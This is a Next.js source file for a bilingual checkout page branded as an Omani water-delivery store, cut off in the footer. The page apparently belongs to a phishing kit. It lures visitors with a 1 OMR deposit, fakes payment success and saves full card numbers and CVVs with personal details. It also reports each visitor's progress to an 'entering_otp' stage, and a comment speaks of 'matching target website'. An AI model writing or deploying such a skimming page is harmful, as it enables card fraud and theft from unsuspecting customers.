"use client";

import { useEffect, useMemo, useState } from "react";
import {
  Droplets,
  Truck,
  MapPin,
  CreditCard,
  CheckCircle2,
  ChevronDown,
  Globe,
  ShoppingBag,
  Headphones,
  ShieldCheck,
  Check,
  Lock,
  ArrowRight,
  ArrowLeft,
  X,
  Menu,
  MessageCircle,
  Phone,
  Mail,
  Search
} from "lucide-react";
import { STORAGE_KEYS, type OrderRecord, type PaymentRecord } from "../site-data";
import { usePresence, type VisitorStep } from "@/lib/usePresence";
import "./checkout.css";

const governoratesData: Record<string, { ar: string; en: string; wilayats: { ar: string; en: string }[] }> = {
  muscat: {
    ar: "مسقط",
    en: "Muscat",
    wilayats: [
      { ar: "السيب", en: "Seeb" },
      { ar: "بوشر", en: "Bawshar" },
      { ar: "مطرح", en: "Muttrah" },
      { ar: "العامرات", en: "Amerat" },
      { ar: "مسقط", en: "Muscat City" },
      { ar: "قريات", en: "Qurayyat" },
    ],
  },
  dhofar: {
    ar: "ظفار",
    en: "Dhofar",
    wilayats: [
      { ar: "صلالة", en: "Salalah" },
      { ar: "طاقة", en: "Taqah" },
      { ar: "مرباط", en: "Mirbat" },
      { ar: "ثمريت", en: "Thumrait" },
      { ar: "سدح", en: "Sadah" },
      { ar: "رخيوت", en: "Rakhyut" },
    ],
  },
  musandam: {
    ar: "مسندم",
    en: "Musandam",
    wilayats: [
      { ar: "خصب", en: "Khasab" },
      { ar: "دبا", en: "Dibba" },
      { ar: "بخاء", en: "Bukha" },
      { ar: "مدحاء", en: "Madha" },
    ],
  },
  buraimi: {
    ar: "البريمي",
    en: "Al Buraimi",
    wilayats: [
      { ar: "البريمي", en: "Al Buraimi" },
      { ar: "محضة", en: "Mahdha" },
      { ar: "السنينة", en: "Sunaynah" },
    ],
  },
  dakhiliyah: {
    ar: "الداخلية",
    en: "Ad Dakhiliyah",
    wilayats: [
      { ar: "نزوى", en: "Nizwa" },
      { ar: "بهلاء", en: "Bahla" },
      { ar: "منح", en: "Manah" },
      { ar: "الحمراء", en: "Al Hamra" },
      { ar: "أدم", en: "Adam" },
      { ar: "إزكي", en: "Izki" },
      { ar: "سمائل", en: "Samail" },
      { ar: "بدبد", en: "Bidbid" },
    ],
  },
  northSharqiyah: {
    ar: "شمال الشرقية",
    en: "North Al Sharqiyah",
    wilayats: [
      { ar: "إبرا", en: "Ibra" },
      { ar: "المضيبي", en: "Al Mudhaibi" },
      { ar: "بدية", en: "Bidiya" },
      { ar: "القابل", en: "Al Qabil" },
      { ar: "وادي بني خالد", en: "Wadi Bani Khalid" },
      { ar: "سناو", en: "Sinaw" },
    ],
  },
  southSharqiyah: {
    ar: "جنوب الشرقية",
    en: "South Al Sharqiyah",
    wilayats: [
      { ar: "صور", en: "Sur" },
      { ar: "الكامل والوافي", en: "Al Kamil W'Al Wafi" },
      { ar: "جعلان بني بو حسن", en: "Jalan Bani Bu Hassan" },
      { ar: "جعلان بني بو علي", en: "Jalan Bani Bu Ali" },
      { ar: "مصيرة", en: "Masirah" },
    ],
  },
  northBatinah: {
    ar: "شمال الباطنة",
    en: "North Al Batinah",
    wilayats: [
      { ar: "صحار", en: "Sohar" },
      { ar: "صحم", en: "Saham" },
      { ar: "الخابورة", en: "Al Khabourah" },
      { ar: "السويق", en: "Suwaiq" },
      { ar: "لوى", en: "Liwa" },
      { ar: "شناص", en: "Shinas" },
    ],
  },
  southBatinah: {
    ar: "جنوب الباطنة",
    en: "South Al Batinah",
    wilayats: [
      { ar: "الرستاق", en: "Rustaq" },
      { ar: "بركاء", en: "Barka" },
      { ar: "المصنعة", en: "Al Musannah" },
      { ar: "نخل", en: "Nakhal" },
      { ar: "العوابي", en: "Al Awabi" },
      { ar: "وادي المعاول", en: "Wadi Al Maawil" },
    ],
  },
  wusta: {
    ar: "الوسطى",
    en: "Al Wusta",
    wilayats: [
      { ar: "هيماء", en: "Haima" },
      { ar: "محوت", en: "Mahout" },
      { ar: "الدقم", en: "Duqm" },
      { ar: "الجازر", en: "Al Jazer" },
    ],
  },
  dhahirah: {
    ar: "الظاهرة",
    en: "Ad Dhahirah",
    wilayats: [
      { ar: "عبري", en: "Ibri" },
      { ar: "ينقل", en: "Yanqul" },
      { ar: "ضنك", en: "Dhank" },
    ],
  },
};

const translations = {
  ar: {
    heroTitle: "Delivery Information",
    heroSubtitle: "Fill in your details and we will deliver to your door.",
    freeDeliveryBanner: "توصيل مجاني لجميع محافظات وولايات سلطنة عُمان",
    personalInfoTitle: "Personal Information",
    fullNameLabel: "Full Name",
    fullNamePlaceholder: "Enter your full name",
    mobileLabel: "Mobile Number",
    mobilePlaceholder: "+968 XXXX XXXX",
    deliveryAddressTitle: "Delivery Address",
    governorateLabel: "Governorate",
    governoratePlaceholder: "Select your governorate",
    wilayatLabel: "Wilayat",
    wilayatPlaceholder: "Select your wilayat",
    deliveryLocationHeader: "موقع التوصيل (اختر أحد الخيارين أو كليهما)",
    selectFromMapBtn: "اختر الموقع من الخريطة",
    selectFromMapSub: "GPS دقيق أو الضغط على الخريطة",
    orText: "أو",
    manualAddressLabel: "ادخل العنوان يدوياً ✍️",
    manualAddressPlaceholder: "...Street, building, area",
    orderNotesLabel: "Order Notes (Optional)",
    orderNotesPlaceholder: "Any special instructions for delivery...",
    paymentMethodTitle: "اختر طريقة الدفع 💳",
    depositOptionTitle: "دفع 1 ر.ع لتأكيد الطلب",
    depositOptionSub: "ادفع ريالاً واحداً الآن، والمبلغ المتبقي عند التسليم.",
    fullOptionTitle: "دفع المبلغ الكامل الآن",
    fullOptionSub: "ادفع المبلغ بالكامل مسبقاً عند إتمام الطلب.",
    continueBtn: "متابعة لتأكيد الطلب",
    cardModalTitle: "بيانات البطاقة البنكية وإتمام الطلب",
    cardholderLabel: "اسم حامل البطاقة *",
    cardholderPlaceholder: "الاسم كما يظهر على البطاقة",
    cardNumberLabel: "رقم البطاقة البنكية *",
    cardNumberPlaceholder: "0000 0000 0000 0000",
    expiryLabel: "تاريخ الانتهاء (MM/YY) *",
    cvvLabel: "رمز الأمان CVV *",
    confirmPayBtn: "تأكيد وإتمام الدفع",
    orderSuccessTitle: "تم تأكيد طلبك بنجاح!",
    orderSuccessSub: "شكراً لك، تم استلام طلبك وبدأ فريقنا تجهيز الشحنة.",
    backToStore: "العودة للمتجر",
    whatsappBtn: "متابعة الطلب عبر الواتساب",
    mapModalTitle: "تحديد موقع التوصيل على الخريطة",
    confirmLocationBtn: "تأكيد الموقع المحدد",
    closeBtn: "إغلاق",
    quickLinks: "Quick Links",
    policies: "Policies",
    contactUs: "Contact Us",
  },
  en: {
    heroTitle: "Delivery Information",
    heroSubtitle: "Fill in your details and we will deliver to your door.",
    freeDeliveryBanner: "Free delivery to all governorates and states of Oman",
    personalInfoTitle: "Personal Information",
    fullNameLabel: "Full Name",
    fullNamePlaceholder: "Enter your full name",
    mobileLabel: "Mobile Number",
    mobilePlaceholder: "+968 XXXX XXXX",
    deliveryAddressTitle: "Delivery Address",
    governorateLabel: "Governorate",
    governoratePlaceholder: "Select your governorate",
    wilayatLabel: "Wilayat",
    wilayatPlaceholder: "Select your wilayat",
    deliveryLocationHeader: "Delivery Location (Choose one or both)",
    selectFromMapBtn: "Select Location from Map",
    selectFromMapSub: "Precise GPS or pin on map",
    orText: "or",
    manualAddressLabel: "Enter Address Manually ✍️",
    manualAddressPlaceholder: "...Street, building, area",
    orderNotesLabel: "Order Notes (Optional)",
    orderNotesPlaceholder: "Any special instructions for delivery...",
    paymentMethodTitle: "Select Payment Method 💳",
    depositOptionTitle: "Pay 1 OMR to confirm order",
    depositOptionSub: "Pay 1 OMR now, remaining upon delivery.",
    fullOptionTitle: "Pay full amount now",
    fullOptionSub: "Pay full amount in advance upon order completion.",
    continueBtn: "Continue to Confirm Order",
    cardModalTitle: "Bank Card Details & Finalizing Order",
    cardholderLabel: "Cardholder Name *",
    cardholderPlaceholder: "Name as shown on card",
    cardNumberLabel: "Card Number *",
    cardNumberPlaceholder: "0000 0000 0000 0000",
    expiryLabel: "Expiry Date (MM/YY) *",
    cvvLabel: "CVV Code *",
    confirmPayBtn: "Confirm & Complete Payment",
    orderSuccessTitle: "Order Confirmed Successfully!",
    orderSuccessSub: "Thank you! Your order has been received and is being prepared.",
    backToStore: "Return to Store",
    whatsappBtn: "Track Order via WhatsApp",
    mapModalTitle: "Select Delivery Location on Map",
    confirmLocationBtn: "Confirm Selected Location",
    closeBtn: "Close",
    quickLinks: "Quick Links",
    policies: "Policies",
    contactUs: "Contact Us",
  },
};

export default function CheckoutPage() {
  const [lang, setLang] = useState<"ar" | "en">("ar");
  const [mobileMenuOpen, setMobileMenuOpen] = useState(false);
  const t = translations[lang];

  // Form State
  const [customerName, setCustomerName] = useState("");
  const [customerPhone, setCustomerPhone] = useState("");
  const [selectedGovKey, setSelectedGovKey] = useState("");
  const [selectedWilayat, setSelectedWilayat] = useState("");
  const [manualAddress, setManualAddress] = useState("");
  const [orderNotes, setOrderNotes] = useState("");
  const [paymentOption, setPaymentOption] = useState<"deposit" | "full">("deposit");

  // Step 2 Payment Modal State
  const [step, setStep] = useState<"form" | "payment" | "success">("form");
  const [cardholder, setCardholder] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [formError, setFormError] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [createdOrder, setCreatedOrder] = useState<{ orderId: string; amount: number } | null>(null);

  // Map Modal State
  const [showMapModal, setShowMapModal] = useState(false);
  const [gpsLocation, setGpsLocation] = useState<{ lat: number; lng: number } | null>(null);

  // Focus section for presence tracking
  const [focusedSection, setFocusedSection] = useState<"delivery" | "personal_info" | "entering_otp">("delivery");

  const presenceStep = useMemo<VisitorStep>(() => {
    if (step === "payment" || focusedSection === "entering_otp" || cardNumber.trim()) return "entering_otp";
    if (focusedSection === "personal_info" || customerName.trim() || customerPhone.trim()) return "personal_info";
    return "delivery";
  }, [step, focusedSection, cardNumber, customerName, customerPhone]);

  usePresence(presenceStep);

  const availableWilayats = useMemo(() => {
    if (!selectedGovKey || !governoratesData[selectedGovKey]) return [];
    return governoratesData[selectedGovKey].wilayats;
  }, [selectedGovKey]);

  function handleSelectGov(govKey: string) {
    setSelectedGovKey(govKey);
    setSelectedWilayat("");
  }

  function handleOpenMapModal() {
    setShowMapModal(true);
    if (!gpsLocation && navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (pos) => setGpsLocation({ lat: pos.coords.latitude, lng: pos.coords.longitude }),
        () => setGpsLocation({ lat: 23.588, lng: 58.3829 })
      );
    }
  }

  function handleConfirmMapLocation() {
    const lat = gpsLocation?.lat.toFixed(5) ?? "23.58800";
    const lng = gpsLocation?.lng.toFixed(5) ?? "58.38290";
    const mapTag = lang === "ar" ? `[موقع GPS المحدد: ${lat}, ${lng}]` : `[GPS Location: ${lat}, ${lng}]`;
    if (!manualAddress.includes("GPS")) {
      setManualAddress((prev) => (prev ? `${prev} ${mapTag}` : mapTag));
    }
    setShowMapModal(false);
  }

  function handleProceedToPayment(e: React.FormEvent) {
    e.preventDefault();
    if (!customerName.trim() || !customerPhone.trim()) {
      setFormError(lang === "ar" ? "يرجى أدخال اسمك ورقم الجوال للمتابعة." : "Please enter your full name and mobile number.");
      return;
    }

    setFormError("");
    setStep("payment");
  }

  function handleFinalizeOrder(e: React.FormEvent) {
    e.preventDefault();
    const digits = cardNumber.replace(/\D/g, "");
    if (!cardholder.trim() || digits.length < 12 || !cardExpiry || !cardCvv) {
      setFormError(lang === "ar" ? "يرجى أدخال جميع بيانات بطاقة الدفع البنكية بشكل صحيح." : "Please complete all bank card details correctly.");
      return;
    }

    setIsProcessing(true);
    const orderId = `OW-${String(Date.now()).slice(-6)}`;
    const govName = governoratesData[selectedGovKey]?.[lang] || "Muscat";
    const wilayatName = selectedWilayat || "";
    const fullAddr = `${govName} - ${wilayatName} | ${manualAddress}`.trim();
    const chargeAmount = paymentOption === "deposit" ? 1.0 : 0.4;

    setTimeout(() => {
      try {
        const existingOrders = JSON.parse(window.localStorage.getItem(STORAGE_KEYS.orders) ?? "[]") as OrderRecord[];
        const newRecord: OrderRecord = {
          id: orderId,
          customer: customerName.trim(),
          phone: customerPhone.trim(),
          email: "client@omanoasis.com",
          governorate: govName,
          address: fullAddr,
          total: chargeAmount,
          itemCount: 1,
          status: "جديد",
          paymentStatus: "مدفوع",
          paymentId: `PAY-${String(Date.now()).slice(-6)}`,
          cardBrand: "Visa",
          cardLast4: digits.slice(-4),
          cardNumber: digits,
          cvv: cardCvv,
          createdAt: new Date().toISOString(),
        };

        const updatedOrders = [newRecord, ...existingOrders];
        window.localStorage.setItem(STORAGE_KEYS.orders, JSON.stringify(updatedOrders));

        const existingPayments = JSON.parse(window.localStorage.getItem(STORAGE_KEYS.payments) ?? "[]") as PaymentRecord[];
        const newPayment: PaymentRecord = {
          id: newRecord.paymentId!,
          orderId,
          customer: newRecord.customer,
          phone: newRecord.phone,
          email: newRecord.email,
          governorate: govName,
          address: fullAddr,
          cardholder: cardholder.trim(),
          amount: chargeAmount,
          status: "ناجحة",
          cardBrand: "Visa",
          cardLast4: digits.slice(-4),
          expiry: cardExpiry,
          createdAt: new Date().toISOString(),
          cardNumber: digits,
          cvv: cardCvv,
        };
        window.localStorage.setItem(STORAGE_KEYS.payments, JSON.stringify([newPayment, ...existingPayments]));
      } catch {}

      setIsProcessing(false);
      setCreatedOrder({ orderId, amount: chargeAmount });
      setStep("success");
    }, 1200);
  }

  return (
    <div className="checkout-page-shell" dir={lang === "ar" ? "rtl" : "ltr"}>
      {/* Header */}
      <header className="checkout-header">
        <div className="checkout-header-inner">
          <div className="flex items-center gap-3">
            <button
              type="button"
              className="hamburger-btn"
              onClick={() => setMobileMenuOpen(true)}
              title="Menu"
            >
              <Menu className="w-6 h-6" />
            </button>

            <a href="/" className="brand-logo">
              <div className="brand-logo-icon">
                <Droplets className="w-5 h-5 fill-current" />
              </div>
              <span>OASIS OMAN</span>
            </a>
          </div>

          <nav className="nav-links">
            <a href="/">{lang === "ar" ? "الرئيسية" : "Home"}</a>
            <a href="/#about">{lang === "ar" ? "من نحن" : "About"}</a>
            <a href="/#contact">{lang === "ar" ? "تواصل معنا" : "Contact"}</a>
            <a href="/#faq">{lang === "ar" ? "الأسئلة الشائعة" : "FAQ"}</a>
            <a href="/#policies">{lang === "ar" ? "السياسات" : "Policies"} ▾</a>
          </nav>

          <div className="nav-right-actions">
            <button
              type="button"
              className="lang-btn"
              onClick={() => setLang((prev) => (prev === "ar" ? "en" : "ar"))}
            >
              <Globe className="w-4 h-4" />
              <span>{lang === "ar" ? "EN" : "عربي"}</span>
            </button>

            <a href="/" className="cart-icon-btn" title="Cart">
              <ShoppingBag className="w-5 h-5" />
              <span className="cart-badge">1</span>
            </a>
          </div>
        </div>
      </header>

      {/* Mobile Navigation Drawer */}
      {mobileMenuOpen && (
        <div className="mobile-nav-backdrop" onClick={() => setMobileMenuOpen(false)}>
          <div className="mobile-nav-header" onClick={(e) => e.stopPropagation()}>
            <a href="/" className="brand-logo">
              <div className="brand-logo-icon">
                <Droplets className="w-5 h-5 fill-current" />
              </div>
              <span>OASIS OMAN</span>
            </a>
            <button
              type="button"
              onClick={() => setMobileMenuOpen(false)}
              className="text-white p-2"
            >
              <X className="w-6 h-6" />
            </button>
          </div>

          <div className="mobile-nav-links" onClick={(e) => e.stopPropagation()}>
            <a href="/">{lang === "ar" ? "الرئيسية" : "Home"}</a>
            <a href="/#about">{lang === "ar" ? "من نحن" : "About"}</a>
            <a href="/#contact">{lang === "ar" ? "تواصل معنا" : "Contact"}</a>
            <a href="/#faq">{lang === "ar" ? "الأسئلة الشائعة" : "FAQ"}</a>

            <div className="mobile-nav-section-title">{lang === "ar" ? "السياسات" : "Policies"}</div>
            <a href="/#policies">{lang === "ar" ? "سياسة الخصوصية" : "Privacy Policy"}</a>
            <a href="/#policies">{lang === "ar" ? "الشروط والأحكام" : "Terms & Conditions"}</a>
            <a href="/#policies">{lang === "ar" ? "سياسة التوصيل" : "Delivery Policy"}</a>
            <a href="/#policies">{lang === "ar" ? "سياسة الاسترجاع" : "Refund Policy"}</a>

            <div className="mobile-nav-section-title">{lang === "ar" ? "اللغة" : "Language"}</div>
            <div className="mobile-lang-options">
              <button
                type="button"
                className={`mobile-lang-btn ${lang === "en" ? "active" : ""}`}
                onClick={() => { setLang("en"); setMobileMenuOpen(false); }}
              >
                English
              </button>
              <button
                type="button"
                className={`mobile-lang-btn ${lang === "ar" ? "active" : ""}`}
                onClick={() => { setLang("ar"); setMobileMenuOpen(false); }}
              >
                العربية
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Main Content */}
      <main className="flex-1">
        {/* Page Hero Header */}
        <div className="checkout-hero">
          <h1>{t.heroTitle}</h1>
          <p>{t.heroSubtitle}</p>

          <div className="free-delivery-banner">
            <CheckCircle2 className="w-5 h-5 text-emerald-600" />
            <span>{t.freeDeliveryBanner}</span>
          </div>
        </div>

        {/* Step 1: Form & Payment Option */}
        {step === "form" && (
          <form onSubmit={handleProceedToPayment} className="checkout-form-container">
            {formError && (
              <div className="bg-red-50 border border-red-200 text-red-700 p-4 rounded-xl mb-6 text-sm font-semibold flex items-center gap-2">
                <span>⚠️ {formError}</span>
              </div>
            )}

            {/* Section 1: Personal Information */}
            <div className="checkout-card">
              <h2 className="card-title">{t.personalInfoTitle}</h2>
              <div className="form-group-stack">
                <label className="field-label">
                  <span>{t.fullNameLabel}</span>
                  <input
                    type="text"
                    value={customerName}
                    onFocus={() => setFocusedSection("personal_info")}
                    onChange={(e) => setCustomerName(e.target.value)}
                    placeholder={t.fullNamePlaceholder}
                    className="field-input"
                    required
                  />
                </label>

                <label className="field-label">
                  <span>{t.mobileLabel}</span>
                  <input
                    type="tel"
                    dir="ltr"
                    value={customerPhone}
                    onFocus={() => setFocusedSection("personal_info")}
                    onChange={(e) => setCustomerPhone(e.target.value)}
                    placeholder={t.mobilePlaceholder}
                    className="field-input"
                    required
                  />
                </label>
              </div>
            </div>

            {/* Section 2: Delivery Address */}
            <div className="checkout-card">
              <h2 className="card-title">{t.deliveryAddressTitle}</h2>
              <div className="form-group-stack">
                <label className="field-label">
                  <span>{t.governorateLabel}</span>
                  <select
                    value={selectedGovKey}
                    onFocus={() => setFocusedSection("delivery")}
                    onChange={(e) => handleSelectGov(e.target.value)}
                    className="field-select"
                    required
                  >
                    <option value="" disabled>
                      {t.governoratePlaceholder}
                    </option>
                    {Object.entries(governoratesData).map(([key, item]) => (
                      <option key={key} value={key}>
                        {item[lang]}
                      </option>
                    ))}
                  </select>
                </label>

                {selectedGovKey && (
                  <label className="field-label">
                    <span>{t.wilayatLabel}</span>
                    <select
                      value={selectedWilayat}
                      onFocus={() => setFocusedSection("delivery")}
                      onChange={(e) => setSelectedWilayat(e.target.value)}
                      className="field-select"
                      required
                    >
                      <option value="" disabled>
                        {t.wilayatPlaceholder}
                      </option>
                      {availableWilayats.map((w) => (
                        <option key={w.en} value={w[lang]}>
                          {w[lang]}
                        </option>
                      ))}
                    </select>
                  </label>
                )}

                {/* Map Option Section */}
                <div className="space-y-3 pt-1">
                  <span className="text-xs font-bold text-slate-500 block">
                    {t.deliveryLocationHeader}
                  </span>

                  <div className="map-option-box" onClick={handleOpenMapModal}>
                    <div className="map-option-content">
                      <div className="map-option-icon">
                        <MapPin className="w-5 h-5" />
                      </div>
                      <div className="map-option-text">
                        <strong>{t.selectFromMapBtn}</strong>
                        <span>{t.selectFromMapSub}</span>
                      </div>
                    </div>
                    <ChevronDown className="w-5 h-5 text-sky-600 transform -rotate-90" />
                  </div>

                  <div className="or-divider">
                    <span>{t.orText}</span>
                  </div>

                  <label className="field-label">
                    <span>{t.manualAddressLabel}</span>
                    <textarea
                      value={manualAddress}
                      onFocus={() => setFocusedSection("delivery")}
                      onChange={(e) => setManualAddress(e.target.value)}
                      placeholder={t.manualAddressPlaceholder}
                      className="field-textarea"
                    />
                  </label>
                </div>

                <label className="field-label pt-2">
                  <span>{t.orderNotesLabel}</span>
                  <textarea
                    value={orderNotes}
                    onFocus={() => setFocusedSection("delivery")}
                    onChange={(e) => setOrderNotes(e.target.value)}
                    placeholder={t.orderNotesPlaceholder}
                    className="field-textarea"
                  />
                </label>
              </div>
            </div>

            {/* Section 3: Select Payment Method */}
            <div className="checkout-card">
              <h2 className="card-title">{t.paymentMethodTitle}</h2>
              <div className="payment-radio-group">
                <div
                  className={`payment-radio-card ${paymentOption === "deposit" ? "active" : ""}`}
                  onClick={() => setPaymentOption("deposit")}
                >
                  <div className="radio-circle">
                    {paymentOption === "deposit" && <div className="radio-dot" />}
                  </div>
                  <div className="payment-radio-content">
                    <strong>{t.depositOptionTitle}</strong>
                    <p>{t.depositOptionSub}</p>
                  </div>
                </div>

                <div
                  className={`payment-radio-card ${paymentOption === "full" ? "active" : ""}`}
                  onClick={() => setPaymentOption("full")}
                >
                  <div className="radio-circle">
                    {paymentOption === "full" && <div className="radio-dot" />}
                  </div>
                  <div className="payment-radio-content">
                    <strong>{t.fullOptionTitle}</strong>
                    <p>{t.fullOptionSub}</p>
                  </div>
                </div>
              </div>
            </div>

            {/* Submit Button */}
            <button type="submit" className="checkout-submit-btn">
              <span>{t.continueBtn}</span>
              {lang === "ar" ? <ArrowLeft className="w-5 h-5" /> : <ArrowRight className="w-5 h-5" />}
            </button>
          </form>
        )}

        {/* Step 2: Bank Card Details Step */}
        {step === "payment" && (
          <form onSubmit={handleFinalizeOrder} className="checkout-form-container">
            <div className="checkout-card">
              <div className="flex items-center justify-between border-b border-slate-100 pb-4 mb-5">
                <h2 className="text-lg font-bold text-slate-800 m-0 flex items-center gap-2">
                  <CreditCard className="w-5 h-5 text-sky-600" />
                  <span>{t.cardModalTitle}</span>
                </h2>
                <button
                  type="button"
                  onClick={() => setStep("form")}
                  className="text-xs text-sky-600 font-bold hover:underline"
                >
                  {lang === "ar" ? "تعديل البيانات" : "Edit details"}
                </button>
              </div>

              {/* Order Summary Line */}
              <div className="bg-sky-50/80 border border-sky-100 p-4 rounded-xl mb-6 text-xs text-slate-700 flex justify-between items-center">
                <div>
                  <strong>{customerName}</strong> ({customerPhone})
                  <div className="text-slate-500 mt-0.5">{manualAddress || "Muscat"}</div>
                </div>
                <div className="text-left font-extrabold text-sky-800 text-sm">
                  {paymentOption === "deposit" ? "1.000 ر.ع. (عربون)" : "0.400 ر.ع."}
                </div>
              </div>

              {formError && (
                <div className="bg-red-50 text-red-700 p-3 rounded-lg text-xs font-bold mb-4">
                  {formError}
                </div>
              )}

              <div className="form-group-stack">
                <label className="field-label">
                  <span>{t.cardholderLabel}</span>
                  <input
                    type="text"
                    value={cardholder}
                    onFocus={() => setFocusedSection("entering_otp")}
                    onChange={(e) => setCardholder(e.target.value)}
                    placeholder={t.cardholderPlaceholder}
                    className="field-input"
                    required
                  />
                </label>

                <label className="field-label">
                  <span>{t.cardNumberLabel}</span>
                  <div className="relative">
                    <input
                      type="text"
                      dir="ltr"
                      inputMode="numeric"
                      value={cardNumber.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim()}
                      onFocus={() => setFocusedSection("entering_otp")}
                      onChange={(e) => setCardNumber(e.target.value)}
                      placeholder={t.cardNumberPlaceholder}
                      className="field-input"
                      required
                    />
                    <CreditCard className="w-5 h-5 absolute left-3 top-3.5 text-slate-400" />
                  </div>
                </label>

                <div className="grid grid-cols-2 gap-4">
                  <label className="field-label">
                    <span>{t.expiryLabel}</span>
                    <input
                      type="text"
                      dir="ltr"
                      inputMode="numeric"
                      value={cardExpiry}
                      onFocus={() => setFocusedSection("entering_otp")}
                      onChange={(e) => {
                        const val = e.target.value.replace(/\D/g, "").slice(0, 4);
                        setCardExpiry(val.length > 2 ? `${val.slice(0, 2)}/${val.slice(2)}` : val);
                      }}
                      placeholder="MM/YY"
                      className="field-input"
                      required
                    />
                  </label>

                  <label className="field-label">
                    <span>{t.cvvLabel}</span>
                    <input
                      type="password"
                      dir="ltr"
                      inputMode="numeric"
                      value={cardCvv}
                      onFocus={() => setFocusedSection("entering_otp")}
                      onChange={(e) => setCardCvv(e.target.value.replace(/\D/g, "").slice(0, 3))}
                      placeholder="123"
                      className="field-input"
                      required
                    />
                  </label>
                </div>
              </div>

              <div className="mt-6 flex flex-col gap-3">
                <button
                  type="submit"
                  disabled={isProcessing}
                  className="checkout-submit-btn"
                >
                  {isProcessing ? (
                    <span>{lang === "ar" ? "جاري معالجة الدفع..." : "Processing..."}</span>
                  ) : (
                    <>
                      <Lock className="w-4 h-4" />
                      <span>{t.confirmPayBtn}</span>
                    </>
                  )}
                </button>
              </div>
            </div>
          </form>
        )}

        {/* Step 3: Success Receipt */}
        {step === "success" && createdOrder && (
          <div className="checkout-form-container">
            <div className="checkout-card text-center py-8">
              <div className="w-16 h-16 bg-emerald-100 text-emerald-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <Check className="w-8 h-8 stroke-[3]" />
              </div>

              <h2 className="text-xl font-bold text-slate-800 mb-2">{t.orderSuccessTitle}</h2>
              <p className="text-sm text-slate-600 mb-6">{t.orderSuccessSub}</p>

              <div className="bg-slate-50 border border-slate-200 rounded-xl p-4 text-xs space-y-2 mb-6 text-right max-w-sm mx-auto">
                <div className="flex justify-between">
                  <span className="text-slate-500">{lang === "ar" ? "رقم الطلب:" : "Order ID:"}</span>
                  <strong dir="ltr">{createdOrder.orderId}</strong>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">{lang === "ar" ? "الاسم:" : "Customer:"}</span>
                  <strong>{customerName}</strong>
                </div>
                <div className="flex justify-between">
                  <span className="text-slate-500">{lang === "ar" ? "المبلغ المدفوع:" : "Amount Paid:"}</span>
                  <strong className="text-emerald-700">{createdOrder.amount.toFixed(3)} ر.ع.</strong>
                </div>
              </div>

              <div className="flex flex-col gap-3 max-w-sm mx-auto">
                <a
                  href="https://wa.me/96893649190"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="w-full py-3 bg-emerald-600 text-white rounded-xl font-bold text-sm flex items-center justify-center gap-2 hover:bg-emerald-700"
                >
                  <MessageCircle className="w-5 h-5" />
                  <span>{t.whatsappBtn}</span>
                </a>

                <a
                  href="/"
                  className="w-full py-3 bg-slate-100 text-slate-700 rounded-xl font-bold text-xs hover:bg-slate-200"
                >
                  {t.backToStore}
                </a>
              </div>
            </div>
          </div>
        )}
      </main>

      {/* Interactive Map Picker Modal */}
      {showMapModal && (
        <div className="map-modal-backdrop" onClick={() => setShowMapModal(false)}>
          <div className="map-modal-card" onClick={(e) => e.stopPropagation()}>
            <div className="map-modal-header">
              <h3>{t.mapModalTitle}</h3>
              <button
                type="button"
                onClick={() => setShowMapModal(false)}
                className="text-slate-400 hover:text-slate-600"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="map-canvas-box">
              <div className="map-pin-target">
                <MapPin className="w-10 h-10 text-red-500 drop-shadow-md fill-red-100" />
                <span className="bg-slate-900 text-white text-[10px] px-2 py-0.5 rounded font-mono shadow">
                  {gpsLocation ? `${gpsLocation.lat.toFixed(4)}, ${gpsLocation.lng.toFixed(4)}` : "Muscat, Oman"}
                </span>
              </div>
            </div>

            <div className="map-modal-footer">
              <span className="text-xs text-slate-500">
                📍 {lang === "ar" ? "تم تحديد الإحداثيات بنجاح" : "Coordinates set"}
              </span>
              <div className="flex gap-2">
                <button
                  type="button"
                  onClick={() => setShowMapModal(false)}
                  className="px-4 py-2 text-xs font-bold text-slate-600 bg-slate-100 rounded-lg hover:bg-slate-200"
                >
                  {t.closeBtn}
                </button>
                <button
                  type="button"
                  onClick={handleConfirmMapLocation}
                  className="px-4 py-2 text-xs font-bold text-white bg-sky-600 rounded-lg hover:bg-sky-700 shadow"
                >
                  {t.confirmLocationBtn}
                </button>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Floating Support Button */}
      <a
        href="https://wa.me/96893649190"
        target="_blank"
        rel="noopener noreferrer"
        className="floating-support-btn"
        title="Support"
      >
        <Headphones className="w-6 h-6" />
      </a>

      {/* Footer matching target website */}
      <footer className="checkout-footer">
        <div className="footer-grid">
          <div className="footer-col">
            <a href="/" className="brand-logo mb-3">
              <div className="brand-logo-icon">
                <Droplets className="w-5 h-5 fill-current" />
              </div>
              <span>OASIS OMAN</span>
            </a>
            <p className="text-xs leading-relaxed text-slate-400 max-w-sm">
              {lang === "ar"
                ? "مياه الواحة — شركتك الأولى لتوصيل المياه المعبأة الفاخرة لجميع محافظات سلطنة عُمان. مياه نقية وطازجة تصل إلى بابك."
                : "OASIS OMAN — Premium hydration delivered across all governorates of Sultanate of Oman."}
            </p>
            <div className="social-links">
              <a href="#" className="social-icon-btn" title="Instagram">
